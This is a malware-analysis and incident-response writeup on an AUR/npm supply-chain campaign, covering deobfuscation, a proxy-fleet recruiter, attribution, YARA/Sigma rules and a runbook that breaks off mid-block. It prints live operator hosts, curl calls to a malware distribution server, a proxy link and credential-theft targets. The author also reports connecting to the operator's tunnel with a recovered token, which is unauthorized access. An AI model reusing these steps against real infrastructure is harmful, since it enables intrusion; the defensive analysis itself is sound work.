CUSTOM = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='
STD    = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
def decode(s):                                       # == the _0x…(index) accessor
    std = s.translate(str.maketrans(CUSTOM, STD))    # permuted alphabet -> standard
    raw = base64.b64decode(std + '=' * (-len(std) % 4))
    return raw.decode('utf-8')                        # the decodeURIComponent step
```

Run that over the 544-entry array and it reproduces the prior sandbox output entry for entry. The 544/544 match is the false-positive control: a key-free transform cannot round-trip if a key or RC4 step actually existed. [`verify_proxy_decoder.py`](https://github.com/UncleJ4ck/cornfield/blob/main/assets/scripts/verify_proxy_decoder.py) parses the array straight out of the source and decodes it with no execution:

```
$ python3 verify_proxy_decoder.py
raw array entries parsed: 544
decode exceptions: 0
_strings.json entries: 544  match: 544  mismatch: 0  missing: 0

--- anchor spot-checks (independent decode) ---
[0]  -> '{}.constructor("return this")( )'    # obfuscator self-reference probe
[3]  -> '443'                                 # CFPORT default
[39] -> 'https://amd64.ssss.nyc.mn/bot'       # cloudflared (argo tunnel) binary
[18] -> '&path=%2Ftrojan-argo%3Fed%3D2560#'   # xray trojan-argo ws path
[49] -> '\n\ntrojan://'                       # subscription-link prefix (trojan)
[66] -> '\nvless://'                          # subscription-link prefix (vless)
[53] -> '/api/add-subscriptions'              # node-list upload endpoint

VERDICT: BASE64-ONLY (no RC4): reimplementation reproduces the array
```

A few raw array entries next to what they decode to (the lowercase-first alphabet is the whole trick):

| index | encoded (custom base64) | decoded |
|---|---|---|
| `[0]` | `E30Uy29UC3rYDwn0B3iOiNjLDhvYBIb0AgLZiIKOicK` | `{}.constructor("return this")( )` |
| `[3]` | `ndqZ` | `443` |
| `[39]` | `Ahr0Chm6lY9HBwq2nc5ZC3nZlM55yY5TBI9IB3q` | `https://amd64.ssss.nyc.mn/bot` |
| `[18]` | `jNbHDgG9jtjgDhjVAMfUlwfYz28Lm0zLzcuZrdi1nJaJ` | `&path=%2Ftrojan-argo%3Fed%3D2560#` |
| `[53]` | `l2fWAs9HzgqTC3vIC2nYAxb0Aw9UCW` | `/api/add-subscriptions` |
| `[66]` | `cNzSzxnZoI8V` | `\nvless://` |

The decoder body settles the RC4 question on its own. Read straight from `_0xdb39` at `index.beautified.js:2934`, the inner `_0x2ce485` does exactly three things: `indexOf` each character into the custom alphabet, standard base64 bit-packing into bytes, then `'%' + charCodeAt.toString(16)` fed to `decodeURIComponent`. No S-box, no 256-element permutation, no XOR. The lowercase-first alphabet (`abc…XYZ…+/=`) where standard base64 is uppercase-first is the entire trick, and it reads as ciphertext at a glance.

Here are those three operations lifted out of `_0x2ce485` (index.beautified.js:2934). I folded the obfuscator.io constant-array arithmetic back to literals and checked each fold: the verbatim `toString(0x1d3 * -0x13 + 0x20aa + -0x1 * -0x20f)` evaluates to `toString(16)`, and `slice(-(0x1962 + -0x214d + 0x7ed * 0x1))` to `slice(-2)`:

```javascript
// index.beautified.js:2934 - the inner decoder _0x2ce485, three string ops (bit-packing loop elided)
const A = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='; // 1. permuted alphabet, lowercase-first
c   = A['indexOf'](c);                                                         // 2. base64 char -> 6-bit value: a TABLE INDEX, not a keyed XOR
out += '%' + ('00' + bytes['charCodeAt'](i)['toString'](16))['slice'](-2);     // 3. each packed byte -> %XX
return decodeURIComponent(out);                                                //    %XX stream -> UTF-8
// absent: S-box, 256-byte key schedule, XOR loop, and any read of the second `key` arg  ->  not RC4
```

A few more mechanics are worth pinning down, because they are what makes "is it RC4" an answer instead of a guess. The array comes from `_0x3da7()` at `index.beautified.js:656`, 544 entries of custom base64 like `E30Uy29UC3rYDwn0B3iOiNjLDhvYBIb0AgLZiIKOicK`. Every reference runs through one accessor, `_0xdb39(index, key)` at `:2934`, which on its first call installs and memoizes the inner decoder shown above. That second `key` parameter is the thing that fools a quick read: in obfuscator.io's RC4 variant it is the RC4 key that gets XORed into the stream, and here the wrappers pass a value into it and the decode body never reads it. Dead parameter, no S-box, no 256-byte key schedule, no XOR loop. Those absences are what "no RC4" actually means, not a vibe off the look of it.

The number a call site hands the accessor is not the array index either. obfuscator.io stacks an arithmetic indirection on top, so the real lookup is `decode(ARR[(rawIndex - 0x7c + 311) % 544])`, and two wrapper functions sit in front of the accessor doing their own offset math, `_0x2e2cd0(a,b,c,d) = _0xdb39(b - 0x1ad, d)` and `_0xe0c276(a,b,c,d) = _0xdb39(d + 0x3cb, a)`, both ultimately feeding `_0xdb39`. The rotation shift `S = 311` is written nowhere. I recovered it as a free variable, then pinned it by forcing three env-var-name anchors (`UPLOAD_URL`, `PROJECT_URL`, `ARGO_DOMAIN`) to round-trip to their known strings, which only happens at `311`. A Babel pass that folds the wrapper chain and constant-evaluates the indices inlined 1,090 of roughly 1,200 call sites. The ~110 left over are the wrapper definitions themselves, not real references.

The reason you cannot shortcut all of this by calling the program's own decoder is the self-defending layer, which is separate from the array rotation. obfuscator.io wraps the file in an anti-tamper guard (`_0x524f3e`, built from the regex pair `\w+ *\(\) *{\w+ *` and `['|"].+['|"];? *}`) that re-checks its own source still looks minified. Beautify or instrument the decoder and the guard trips into a routine that grows an array forever.

```javascript
// index.beautified.js:2963 - the anti-tamper guard _0x524f3e (\x.. escapes are how the regex is hidden)
this['ICpLos'] = '\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';   // ->  \w+ *\(\) *{\w+ *
this['OpFUxE'] = '[\x27|\x22].+[\x27|\x22];?\x20*}';         // ->  ['|"].+['|"];? *}
new RegExp(this['ICpLos'] + this['OpFUxE'])['test'](fn['toString']());  // does the decoder source still look minified?
// if a beautifier or a breakpoint changed the source, test() is false and it falls into:
this['hFlNsy']['push'](Math['round'](Math['random']()));    // <- grow an array forever  ->  the sandbox hangs, never returns
```

That is why "run it in a sandbox and read the strings back" hangs rather than works, and it is the second reason, after the host-execution one, that a pure reimplementation is the right tool: it sidesteps the trap entirely. When I did run the AST tools it was only to corroborate, and only inside that sealed container, which bakes the sample in (COPY, never executed at build) and runs it offline with no host reach:

```
# step 0, on the host: a STATIC reformat for reading (text only, never executed). one line -> 5076.
$ js-beautify index.js -o index.beautified.js  &&  wc -l index.js index.beautified.js
      1 index.js
   5076 index.beautified.js

# the three AST tools EXECUTE the sample's own decoder (node:vm), so they run ONLY in the sealed container
$ docker build -t aur-jsdeob:node20 -f Dockerfile .      # the sample is COPY'd in, never RUN at build
$ docker run --name aur-jsdeob-run --network none --cap-drop ALL \
    --security-opt no-new-privileges --pids-limit 256 --memory 2g aur-jsdeob:node20
=================== webcrack ===================         # webcrack index.js -o out/webcrack
=================== synchrony ==================         # synchrony deobfuscate out/synchrony.js
=================== restringer =================         # restringer index.js -o out/restringer.js
$ docker cp aur-jsdeob-run:/work/out ./deob_out  &&  docker rm -f aur-jsdeob-run
```

`webcrack`'s own transform log is the clearest external read of the obfuscation. It finds the 544-entry array, sees the rotate, names the decoder, then inlines every wrapper and decoded string:

```
webcrack:deobfuscate String Array: _0x3da7, length 544
webcrack:deobfuscate String Array Rotate: yes
webcrack:deobfuscate String Array Decoders: _0xdb39
webcrack:transforms inline-decoder-wrappers: finished with 1314 changes
webcrack:transforms inline-decoded-strings:  finished with 1090 changes
```

That `inline-decoded-strings: 1090` is the same 1,090 call sites my Babel pass folded, reached from the opposite direction, so the two methods cross-check. The extracted outputs by line count, a rough readability proxy (lower is cleaner):

```
$ wc -l deob_out/webcrack/deobfuscated.js deob_out/synchrony.cleaned.js deob_out/restringer.js
   664 deob_out/webcrack/deobfuscated.js     # cleanest; the self-defending wrapper fell in six transforms
  1053 deob_out/synchrony.cleaned.js
  5898 deob_out/restringer.js                # partial; its eval-based resolver did not fully fire vs the self-defense
```

webcrack and synchrony agree with the pure-Python decode on every load-bearing IOC.

What it decodes to: a proxy-node recruiter. It stands up an xray proxy (VLESS, VMess, Trojan) behind a Cloudflare tunnel and reports the node into a fleet. The xray UUID `ff42ddc5-…` is reused fleet-wide as the proxy password.

To a casual visitor the container is camouflaged. On `:3000` it serves a polished decoy landing page titled `CodeFlow | Visual Development Platform`, a fake low-code SaaS with stock-photo hero images, while the real xray proxy listens on `:8001` behind the tunnel. Anyone who stumbles onto the host sees a startup marketing page, not a proxy node.

Two dates place this operation before the AUR attack rather than after it. The container image was built `2026-06-01` (from its own layer history), roughly eight days before the npm and AUR poisoning wave of June 10 to 13, so the resale infrastructure was staged first and the supply-chain push came second. And the TLS certificate for the operator's tunnel domain `jeongyein520.indevs.in` has been active since `2026-01-06` (Google Trust Services), months before any of this surfaced.

That second date comes with a nice visibility asymmetry between the two operations. The stage-one stealer is reached over a Tor onion, and onion services do not use CA-issued certificates, so they leave no Certificate Transparency footprint at all, a `crt.sh` search for the C2 returns nothing, by design. The proxy side, by contrast, fronts a real domain behind Cloudflare, and the moment a public CA issued a leaf for `jeongyein520.indevs.in` it was logged to CT. So `crt.sh` hands you the `2026-01-06` issuance for free, read from the public log rather than re-probed against the operator's infrastructure. The covert leg is invisible to CT and the resale leg is not, and it is the resale leg's own certificate that dates the whole persona. The infrastructure predates the campaign that made it visible, which reads as premeditation, not opportunism.

The interesting credential is `ARGO_AUTH`, hardcoded as a default in the deobfuscated proxy. It is a 184-character base64url cloudflared tunnel token. Decode it:

```
$ python3 decode_argo.py
len(token) = 184
decoded JSON: {"a":"0e1a184426855d762a55cf7287582644",
               "t":"5fed78e8-d0bb-4b59-be34-e48729ea9a98",
               "s":"<redacted: base64 of the tunnel secret>"}
  a (AccountTag) = 0e1a184426855d762a55cf7287582644      <- indicator / takedown anchor
  t (TunnelID)   = 5fed78e8-d0bb-4b59-be34-e48729ea9a98  <- indicator / takedown anchor
  s decoded      = <redacted>   (the reusable tunnel secret, a UUID as a 36-byte ASCII string)
```

One gotcha cost me time here. The `s` field is the tunnel secret encoded as the UUID *string* (36 ASCII bytes), then base64'd. My first attempt decoded the UUID to 16 raw bytes and re-encoded, which Cloudflare's edge rejected with `Unauthorized: Invalid tunnel secret`. The token is fine. I was mangling it. Feed the token through verbatim and it authenticates.

A note on what I am and am not publishing. The AccountTag and TunnelID above are indicators and takedown anchors, exactly what Cloudflare needs in an abuse report to map the account to a registrant and revoke the tunnel, so they stay in full. The reusable tunnel secret (the `s` field, and therefore the full runnable token) is an access credential, not an indicator: anyone holding it can register a connector against the operator's tunnel. Publishing it would hand readers working access to infrastructure I do not own, so it is redacted here and reported to Cloudflare instead. That is the line most IR writeups draw, indicators in full, live access credentials defanged.

To confirm the token was live and not just well-formed, I validated that it was sufficient to register a connector and receive the ingress config. Here is the connector coming up against Cloudflare's edge, and the config Cloudflare pushed down to it:

```
$ /tmp/cloudflared tunnel --protocol http2 run --token "$ARGO_AUTH"   # token withheld, see the note above
ERR  Initial protocol quic failed: write udp ...: operation not permitted
INF  Switching to fallback protocol http2
INF  Registered tunnel connection connIndex=0 location=fra20
INF  Registered tunnel connection connIndex=1 location=tlv01
INF  Registered tunnel connection connIndex=2 location=fra19
INF  Registered tunnel connection connIndex=3 location=tlv01
INF  Updated to new configuration
     config="{\"ingress\":[
        {\"hostname\":\"dcdeploy.jeongyein520.indevs.in\",\"service\":\"http://localhost:8001\"},
        {\"service\":\"http_status:404\"}]}" version=1

$ curl -s http://127.0.0.1:20241/metrics | grep -E 'ha_connections|config_version'
cloudflared_tunnel_ha_connections 4
cloudflared_orchestration_config_version 1
```

That confirms it: the token is live and accepted. Four high-availability connections registered, and Cloudflare handed back the operator's live ingress map: the single hostname `dcdeploy.jeongyein520.indevs.in` routes to `http://localhost:8001`, which is the xray proxy, with a `404` fallback and no hidden routes. The token's feature set also negotiated `allow_remote_config` and `management_logs`, so the operator can push config and stream logs through Cloudflare. As a connector I can only receive those, not initiate them.

Then I stood up a listener on `:8001` and watched. Requests that hit my connector carried Cloudflare edge headers, here is one of my own probes coming back through the tunnel:

```
GET /aabb
CF-Connecting-IP: 169.150.227.201
CF-Ipcountry: IL
CF-Ray: a0c92df49b5e1e75-TLV
CF-Warp-Tag-Id: 76269c6d-1961-4745-8724-51f2c7b88b93
```

Organic victim traffic over roughly eight minutes of monitoring: none. I want to be exact about that. No traffic while I was watching, not "the tunnel is dead." The endpoint had been returning 1033/530 (connector-down) before I registered my connector, so infected resale clients may simply not have retried in my window, and a connector I bring up is one of several HA endpoints. Absence over eight minutes is an observation, not a permanent fact.

The honest limits of that token: it is tunnel-scoped only. It cannot reach the Cloudflare account API, cannot enumerate other tunnels or zones, cannot read the operator's origin IP (Cloudflare's edge holds that, the connector never sees it). So it is a great takedown anchor and a dead end for attribution. The account tag and tunnel UUID are exactly what Cloudflare needs in an abuse report to unmask and revoke. Standing up a connector against someone else's tunnel is unauthorized access, so I am reporting what I did as a research finding and the reader's path here is the abuse report, not the run command.

### what the tunnel was fronting {#xray-config}

With the connector up I could see the full shape of the proxy it routes to. The ingress sends `dcdeploy.jeongyein520.indevs.in` to `http://localhost:8001`, and `:8001` is the public one of five xray inbounds the `generateConfig` routine in the deobfuscated proxy stands up. They share the one fleet UUID. The tunnel routes to `:8001` (VLESS over TCP, `xtls-rprx-vision`), and the rest are localhost fallbacks the connector then exposes:

```
xray inbounds (from generateConfig, index.deob.js)
  :8001  VLESS   tcp  xtls-rprx-vision     <- ARGO_PORT, where the CF tunnel routes
  :3001  VLESS   tcp                        (localhost fallback)
  :3002  VLESS   ws   path=/vless-argo      (localhost fallback)
  :3003  VMess   ws   path=/vmess-argo      (localhost fallback)
  :3004  Trojan  ws   path=/trojan-argo     (localhost fallback)
  UUID (all): ff42ddc5-a217-4254-8c23-5a83050703af
  DoH resolver:     https+local://8.8.8.8/dns-query
  early data:       ed=2560      TLS fingerprint: fp=firefox (uTLS spoof)
```

Clients do not connect to the onion or to the tunnel hostname directly. They domain-front: connect to a clean Cloudflare IP (`saas.sin.fan`, the baked-in `CFIP` default) on 443 with TLS SNI set to `dcdeploy.jeongyein520.indevs.in`, and Cloudflare routes by SNI to the tunnel. The subscription endpoint `/aabb` hands a fresh node list out as base64. The reconstructed VLESS link, with the hardcoded defaults filled in:

```
vless://ff42ddc5-a217-4254-8c23-5a83050703af@saas.sin.fan:443
  ?encryption=none&security=tls&sni=dcdeploy.jeongyein520.indevs.in
  &type=ws&host=dcdeploy.jeongyein520.indevs.in&path=%2Fvless-argo%3Fed%3D2560&fp=firefox
  #dcdeploy.jeongyein520.indevs.in
```

The proxy and monitoring binaries are not in the container image. The recruiter pulls them at runtime from a separate distribution host, `ssss.nyc.mn`, an `eooce` upstream default the operator kept. Both architectures, both live when I checked:

```
$ curl -sI https://amd64.ssss.nyc.mn/web   # xray-core
  Content-Length: 10420256
  sha256: 7cee3cf29afe22209001d890e4cea28e93c3836d47c2835209317d6ca6871420   (Xray/XTLS confirmed in strings)
$ curl -sI https://amd64.ssss.nyc.mn/bot   # cloudflared (argo tunnel), run with --token $ARGO_AUTH
  Content-Length: 41258324
  (arm64 mirror at arm64.ssss.nyc.mn/web and /bot; the nezha agent is a separate /agent + /v1 path, not pulled here)
```

The Nezha leg is dormant in this image (`NEZHA_SERVER`/`PORT`/`KEY` all empty), so the live function is proxy-node recruitment, not monitoring. It is worth saying what the dormant leg would be if it were armed, because the config template is not benign. Nezha is a server-agent monitoring tool, but the agent config it writes carries `disable_command_execute: false`, which is the switch that lets the Nezha server push shell commands to the agent and open a WebSSH session on it. With a real `NEZHA_SERVER` filled in, every recruited node would be a root-capable RAT, not just a proxy exit. Here it ships off, so the capability is staged but inert. The container also negotiated a Cloudflare feature set on registration, `allow_remote_config` and `management_logs` among them, which means the operator can push ingress changes and stream tunnel logs through the dashboard without restarting the node. As a connector I receive those, I do not initiate them. One more `eooce` default the operator left in: a keepalive `POST https://oooo.serv00.net/add-url` that fires when `AUTO_ACCESS=true` and a `PROJECT_URL` is set, a free-host uptime pinger to keep the node from being reaped.

So the second operation is a residential-proxy resale fleet: infected hosts become VLESS/VMess/Trojan exit nodes, fronted by Cloudflare, recruited through the same actor's container. It runs alongside the Monero hijack, off the same persona.

## who is behind it {#attribution}

Two operations, the wallet drainer and the proxy fleet, running off what looks like one persona. The thread that ties them together, and ties both back to an earlier campaign, is twelve words baked into the stealer. The stage-one stealer embeds a BIP-39 mnemonic:

```
bench crane defense corn wheel trial news abuse finish better paddle slush
```

I derived the keys from it with a pure-stdlib BIP39 to BIP32 to secp256k1 pipeline, validated first against the canonical BIP39 test vector so I knew the derivation was correct end to end:

```
$ python3 derive_mnemonic_addrs.py
# sentinel: validate the pipeline against the published BIP39 test vector
  "abandon abandon … about"  ->  0x9858effd232b4033e47d90003d41ec34ecaeda94   (matches the spec, pipeline OK)

# the embedded mnemonic
ETH  m/44'/60'/0'/0/0 : 0x7e28d9889f414b06c19a22a9bd316f0ac279a4d6
BTC  m/44'/0'/0'/0/0  : 134R4vQiMahePPvsJAoZsStabEcNyryVWZ
BTC  m/49'/0'/0'/0/0  : 37BfDuDC6QYn8TBBbBDjt3ADsq63QQwopm
```

Then I checked those three addresses against the public ledgers, which is passive lookup, no infrastructure touched. Every one is virgin: ETH nonce 0 and balance 0, both BTC addresses zero received, zero transactions. So the mnemonic is not the attacker's funded wallet at any standard path. It is a deterministic identity seed or a decoy. What makes it valuable is that it is operator-unique: the phrase has zero coherent hits anywhere else on the web (I checked, it is not a BIP-39 test vector or a known example), and the byte-identical mnemonic also appears, unchanged, in the earlier IronWorm codebase. The same seed in both code families ties them to one operator. The lineage runs Shai-Hulud, then IronWorm, then Atomic Arch.

The persona is `fardewoak` (GitHub id 187815981, account created November 2024, `fardewoak@outlook.com`), which is also the namespace on the proxy container. It is a burner. The real identity is gated behind providers I cannot subpoena, so attribution stops at the account level. I am not going to pretend it goes further than that.

A word on who is not behind this, because supply-chain incidents generate misattribution fast. `arojas` is a real KDE maintainer whose name was forged onto commits, a victim of the impersonation, not a participant. The same care applies one campaign back: in the IronWorm wave that this lineage runs through, `ocrybit` (the developer behind the `asteroiddao` / `asteroid-dao` and Arweave/WeaveDB orgs) is the compromised maintainer whose credentials were stolen, JFrog and SC Media are explicit on that, the exact role `arojas` plays here. Exclude `ocrybit`, `asteroiddao`, and the WeaveDB/Arweave maintainers as victims, not operators. The upstream authors whose emails show up in the binaries are innocent too. The proxy tool is a fork of a public project, so the original author's address rides along on inherited commits, and the crypto libraries copied into the decoy carry their real authors' names (OpenSSL's and the Gladman AES author's) baked into compiled routines. Separately, an account called `pingwin840` started adding harmless scareware echo lines to shell rc files on AUR after the incident broke. That is a copycat riding the chaos, not the operator. None of them should be flagged.

There is also a connective tell between the two stages that I like because it is structural, not circumstantial. Both stages were built on the same box, under the same `/cloud/` tree, with the same toolchain. The strings prove it:

```
$ readelf -p .comment v1 | grep -o 'GCC.*'
GCC: (GNU) 16.1.1 20260430

$ strings v1 | grep -o '/cloud/xmr/monero-gui[^ ]*' | sort | head -1   # 702 such build-tree paths
  /cloud/xmr/monero-gui/monero/contrib/epee/include/net/http_client.h

$ strings jsdigest_deps.bin | grep -o '/cloud/scales[^ ]*scales.bpf.c' | sort -u
  /cloud/scales/agent/../ebpf/scales.bpf.c

$ objdump -d v1 | grep -c '%zmm'
  10910                              # AVX-512 throughout, -march=native on the build box

# not a stray instruction: the whole 512-bit register file is in play, plus the opmask set
$ objdump -d v1 | grep -oE '%zmm[0-9]+' | sed 's/%zmm//' | sort -nu | tr '\n' ' '
  0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31
$ objdump -d v1 | grep -oE '%k[1-7]' | sort -u | tr '\n' ' '
  %k1 %k2 %k3 %k4 %k5 %k6            # AVX-512 opmask registers, an AVX2 build never emits these
$ for i in vpternlogq vpternlogd vmovdqu64 vpxorq; do printf '  %-11s %s\n' $i "$(objdump -d v1 | grep -wc $i)"; done
  vpternlogq  300
  vpternlogd  128
  vmovdqu64   3860
  vpxorq      992
```

The second-stage Monero tree is `/cloud/xmr/monero-gui/`, the stage-one eBPF source is `/cloud/scales/…/scales.bpf.c`, both under `/cloud/`, both GCC 16.1.1 20260430. And it is genuinely vectorized, not one token wide instruction: the build uses zmm0 through zmm31, six opmask registers, three hundred `vpternlogq` and a hundred-odd `vpternlogd`. That is the compiler auto-vectorizing Monero's crypto and epee buffer code for the exact silicon it was built on. The 10,910 AVX-512 instructions also tell you the build box has AVX-512 hardware (Ice Lake or Sapphire Rapids on Intel, Zen 4 on AMD), which is the same wall I hit trying to run it: an AVX2 analysis CPU faults on instruction one. Same machine, two products.

## mitre att&ck {#attack}

Techniques observed in this campaign, each mapped to evidence in the analysis above.

| Tactic | Technique | ID | Evidence in this report |
|---|---|---|---|
| Initial Access | Compromise Software Dependencies and Development Tools | T1195.001 | poisoned AUR `PKGBUILD`/`.install` pull a malicious npm/bun package at build |
| Initial Access | Compromise Software Supply Chain | T1195.002 | `atomic-lockfile`, `lockfile-js`, `js-digest` carry the stealer ELF |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 | obfuscated `post_install()` runs `bun add` |
| Persistence | Create or Modify System Process: Systemd Service | T1543.002 | `moge.service` root + user units, `Restart=always RestartSec=30` |
| Persistence | Compromise Host Software Binary | T1554 | overwrites `/usr/bin/monero-wallet-gui` with the trojaned build |
| Defense Evasion | Obfuscated Files or Information | T1027 | ANSI-C-quoted hook; XOR-encoded onion; obfuscator.io proxy |
| Defense Evasion | Deobfuscate/Decode Files or Information | T1140 | runtime XOR decode `ct[i] ^ key[i%32]` |
| Defense Evasion | Rootkit | T1014 | eBPF hides files, PIDs, and sockets |
| Defense Evasion | Hide Artifacts: Hidden Files and Directories | T1564.001 | `getdents64` dirent splicing |
| Defense Evasion | Indicator Removal | T1070 | zeroes the malware's own lines in `/proc/net/tcp` |
| Defense Evasion | Debugger Evasion | T1622 | `ptrace` tracepoint `bpf_send_signal(9)` against a hidden PID |
| Defense Evasion | Virtualization/Sandbox Evasion: System Checks | T1497.001 | reads DMI/SMBIOS `board_serial` |
| Defense Evasion | Masquerading | T1036 | `kworker/R-kmpat-2358` kernel-thread name spoof; `deps`/`install-deps` naming |
| Credential Access | Unsecured Credentials: Credentials In Files | T1552.001 | `.aws/credentials`, `.npmrc`, `.pypirc`, `gh/hosts.yml`, `.vault-token` |
| Credential Access | Unsecured Credentials: Private Keys | T1552.004 | `.ssh/id_rsa`, `id_ed25519`, PEM keys |
| Credential Access | Steal Application Access Token | T1528 | GitHub PAT, npm token, Discord `mfa.` token, Teams `skypeToken` |
| Credential Access | Credentials from Web Browsers / Steal Web Session Cookie | T1555.003 / T1539 | Slack and Teams Chromium cookie stores |
| Credential Access | Unsecured Credentials: Container API | T1552.007 | `k3s.yaml`, K8s service-account token, Docker/Podman enumeration |
| Discovery | File and Directory Discovery | T1083 | reads `/etc/passwd`, walks `/home/*` |
| Discovery | Process Discovery | T1057 | reads `/proc/*/environ` of all running PIDs |
| Discovery | System Information Discovery | T1082 | `/etc/machine-id`, DMI tables |
| Discovery | Software Discovery | T1518 | wallet and Discord-client presence checks |
| Collection | Data from Information Repositories | T1213 | live HashiCorp Vault API enumeration (`/v1/sys/mounts` + list calls) |
| Command and Control | Application Layer Protocol: Web Protocols | T1071.001 | `GET /api/mt/` tasking |
| Command and Control | Proxy: Multi-hop Proxy | T1090.003 | bundled Tor to the onion C2 |
| Command and Control | Ingress Tool Transfer | T1105 | `GET /bin/linux` second-stage download |
| Exfiltration | Exfiltration Over Web Service | T1567 | multipart `POST` to `temp.sh` (wave-1 file host); onion `POST /upload` is the C2-channel exfil |
| Impact | Financial Theft | T1657 | Monero wallet drainer (auto-sweep) |
| Impact | Resource Hijacking | T1496 | victim host enrolled as an xray VLESS/VMess/Trojan proxy node |

## detection and mitigation {#mitigation}

If you installed AUR packages between roughly June 10 and 13 and anything pulled a `bun add` or npm `preinstall` you did not expect, treat the host as credential-compromised. Not "scan and clear." Rotate.

- Check `/usr/bin/monero-wallet-gui` against your package manager's record. If pacman says the file does not match the package, or the binary is 27 MB and unstripped when stock is 17.5 MB and stripped, do not open a funded wallet with it. Reinstall from the official package.
- Hunt for eBPF persistence: pinned maps under `/sys/fs/bpf/` with names like `hidden_pids`, `hidden_names`, `net_fds`. On a possibly-rootkitted box, trust an out-of-band view (boot clean media) over `ls` and `ss`, because those are exactly what the rootkit censors.
- Rotate every credential that lived on the box: GitHub and npm tokens first (those are the pivot), then SSH keys, cloud tokens, Vault token, any secret passed as an environment variable.
- Sinkhole or block Tor egress from build and developer machines as a baseline. The C2 is onion-only.
- Sinkhole or deny outbound DNS on build agents. The stealer is DNS-gated: in every detonation run it did nothing on the network until a name resolved, and a sinkholed resolver left it dormant on the wire. This contains the beacon and exfil, it does not stop the harvest, which is local and runs regardless, so treat it as containment buying you time to rotate, not prevention.
- If you maintain npm or GitHub packages, assume your publishing tokens were enumerated and audit recent publishes under your name.

YARA, with the catch stated up front: a rule on the raw second-stage ELF will not see the drainer, because the strings are inside a zlib stream. You have to run the drainer rule against the **decompressed** `main.qml`. The rest match on the files as-is.

```yara
rule atomic_arch_monero_drainer_qml {
    // run against DECOMPRESSED main.qml, not the ELF (the ELF compresses these)
    strings:
        $sweep = "createTransactionAllAsync"
        $addr  = "865BH8r1M2Ni6nckpNr357dqDYCC4VkoyeX7EReDmAkYWDnS646BgXeLmH8zcPr7ENbC9ZjzEXyD6ZDkYbfMjefx4aBZF8C"
        $gate  = "unlockedBalanceAll"
        $auto  = "commitTransactionAsync"
    condition:
        $addr and $sweep and $gate and $auto
}

rule atomic_arch_stage1_stealer {
    // matches the deps / js-digest Rust stealer ELF directly
    strings:
        $bpf   = "/cloud/scales/agent/../ebpf/scales.bpf.c"
        $mt    = "/api/mt/"
        $vault = "X-Vault-Token:"
        $gpg   = "--batch --no-tty --list-keys --with-colons --fingerprint"
    condition:
        uint32(0) == 0x464c457f and 2 of ($bpf, $mt, $vault, $gpg)
}
```

On the stage-one rule, `$bpf` (the `scales.bpf.c` build path) is the high-confidence anchor. `$vault` and `$gpg` are generic enough to fire on legitimate admin tooling, so weight the match toward `$bpf` rather than treating the four strings as equal. I would not alert on `$vault + $gpg` alone. Both rules as a file: [`atomic-arch.yar`](https://github.com/UncleJ4ck/cornfield/blob/main/assets/iocs/atomic-arch.yar).

Hash-based detection for the parts that do not need a rule: the embedded eBPF rootkit object is a fixed `sha256 3607de2597f8955f9a88f36ee43b64d3891b8ef536e99fa098e80169350f7b01` in both stealers, and the trojaned `main.qml` decompresses to `sha256 ce8ecab937cf7109f3b344782cd1cbad680d4477965b235b0a59ce888986c4eb` (stock is `5007f0bb9b579176a66430d935192762490df9e87151ceaaa9201491520c4086`).

Sigma, for the host behaviors that YARA cannot catch (the persistence, the rootkit, the binary swap). These are the runtime tells a SIEM or EDR can alert on:

```yaml
title: 'Atomic Arch: monero-wallet-gui binary replaced outside the package manager'
id: 6f1a0a2e-1c44-4b9a-9b6e-atomicarch01
status: experimental
logsource: { product: linux, category: file_event }
detection:
  selection:
    TargetFilename: '/usr/bin/monero-wallet-gui'
  legit:
    Image|endswith: ['/pacman', '/makepkg', '/pamac']
  condition: selection and not legit
level: high
```

```yaml
title: 'Atomic Arch: stealer execution + systemd persistence from /var/lib'
id: 6f1a0a2e-1c44-4b9a-9b6e-atomicarch02
status: experimental
logsource: { product: linux, category: process_creation }
detection:
  drop_exec:
    Image|re: '^/var/lib/[a-z0-9]{4,8}/[a-z0-9]{4,8}$'   # e.g. /var/lib/moge/moge
  condition: drop_exec
level: high
```

```yaml
title: 'Atomic Arch: eBPF rootkit pin maps'
id: 6f1a0a2e-1c44-4b9a-9b6e-atomicarch03
status: experimental
logsource: { product: linux, category: file_event }
detection:
  selection:
    TargetFilename|startswith: '/sys/fs/bpf/'
    TargetFilename|endswith: ['/hidden_pids', '/hidden_names', '/hidden_inodes']
  condition: selection
level: critical
```

```yaml
title: 'Atomic Arch: Vault token theft to local Vault API enumeration'
id: 6f1a0a2e-1c44-4b9a-9b6e-atomicarch04
status: experimental
logsource: { product: linux, category: network_connection }
detection:
  vault_api:
    DestinationIp: '127.0.0.1'
    DestinationPort: 8200
  condition: vault_api   # correlate with a read of ~/.vault-token by the same non-vault PID
level: medium
```

All four Sigma rules as a file: [`atomic-arch.sigma.yml`](https://github.com/UncleJ4ck/cornfield/blob/main/assets/iocs/atomic-arch.sigma.yml).

The strongest behavioral tells, in priority order:
- a write to `/usr/bin/monero-wallet-gui` not attributable to `pacman`/`makepkg`
- any pin under `/sys/fs/bpf/*/hidden_*`
- a process executing from a random two-segment `/var/lib/<8>/<8>` path with a matching `Restart=always` systemd unit
- outbound Tor from a build or developer host
- a non-Vault process reading `~/.vault-token` then connecting to `127.0.0.1:8200`

## incident response runbook {#ir}

If this is on a host you own, here is the response in order. It is shaped by one constraint that changes everything else: the box lies to you.

**The constraint: you cannot trust the host's own tools.** The eBPF rootkit hooks `getdents64` (hides files), `/proc/net/tcp` reads (hides sockets), and `ptrace` (SIGKILLs your debugger). So `ls`, `find`, `ps`, `ss`, `netstat`, even `ls /sys/fs/bpf`, can return a censored view, and attaching a debugger to a hidden PID kills the debugger. Two trusted paths around it: enumerate the rootkit with `bpftool` (raw bpf syscalls the userland hooks do not cover), or pull the disk and triage offline from clean rescue media. Anything enumerated live on the running box is suspect.

**1. Triage and scoping (am I hit, who else is):**

```
# the on-disk wallet should match its package; if pacman says it does not, it was swapped
pacman -Qkk monero-gui
sha256sum /usr/bin/monero-wallet-gui      # 47893d9badc38c54b71321263ce8178c1abb10396e0aadf9793e61ec8829e204 = trojaned; compare vs the package

# fresh AUR installs in the poisoning window are the exposed population (pkgver was not bumped,
